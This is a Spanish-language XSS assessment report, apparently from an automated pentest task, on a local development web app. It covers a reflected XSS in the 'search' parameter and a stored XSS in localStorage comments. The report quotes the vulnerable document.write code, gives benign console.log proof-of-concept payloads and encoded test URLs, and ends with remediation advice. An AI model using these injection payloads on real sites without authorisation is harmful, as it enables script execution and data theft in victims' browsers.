# Informe de análisis XSS

Objetivo: `http://web.dev.local:8082`

Fecha: `2026-04-20T12:23:55Z`

## Resumen

Se identificaron y explotaron con éxito dos vulnerabilidades XSS:

- **Reflected XSS** en el parámetro `search`.
- **Stored XSS** en el sistema de comentarios, persistido en `localStorage`.

## Hallazgos

### 1. Reflected XSS en `search`

La aplicación toma `search` desde `URLSearchParams` y lo inserta directamente en el DOM con `document.write`:

```javascript
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

Esto permite inyectar HTML/JavaScript arbitrario.

**Payload validado**

```html
<img src=x onerror=console.log("POC_SEARCH")>
```

**URL de prueba**

```text
http://web.dev.local:8082/?search=%3Cimg%20src%3Dx%20onerror%3Dconsole.log(%22POC_SEARCH%22)%3E
```

**Resultado**

El payload se ejecutó en navegador headless con Puppeteer y generó la traza de consola `POC_SEARCH`.

### 2. Stored XSS en comentarios

Los parámetros `name` y `comment` se guardan en `localStorage` sin sanitización:

```javascript
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));
```

Después se renderizan también con `document.write`:

```javascript
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Esto permite persistir un payload que se ejecuta cada vez que se visualizan los comentarios.

**Payload validado**

```html
<img src=x onerror=console.log("POC_STORED")>
```

**URL de prueba**

```text
http://web.dev.local:8082/?name=attacker&comment=%3Cimg%20src%3Dx%20onerror%3Dconsole.log(%22POC_STORED%22)%3E
```

**Resultado**

El comentario malicioso quedó almacenado y, al cargar de nuevo la página, el payload se ejecutó. Puppeteer capturó `POC_STORED`.

## Evidencias

Se ejecutó el script local `xss_poc.js` con Puppeteer, obteniendo:

```text
PAGE_CONSOLE:POC_SEARCH
PAGE_CONSOLE:POC_STORED
RESULTS search:true stored:true
```

Durante la revisión del HTML también se confirmó el uso inseguro de `document.write` con datos controlados por el usuario.

## Impacto

- Ejecución de JavaScript arbitrario en el navegador de la víctima.
- Robo de datos accesibles desde el contexto del navegador.
- Defacement del contenido mostrado.
- Persistencia del ataque en el flujo de comentarios.

## Recomendaciones

1. Sustituir `document.write` por creación segura de nodos DOM.
2. Insertar datos de usuario con `textContent` o `createTextNode`, nunca por concatenación HTML.
3. Sanitizar cualquier contenido antes de persistirlo o renderizarlo.
4. Añadir una Content Security Policy estricta para reducir impacto de XSS.
5. Validar y escapar entradas tanto en cliente como en servidor.

## Estado final

- `VULN_FOUND: true`
- `VULN_EXPLOITED: true`
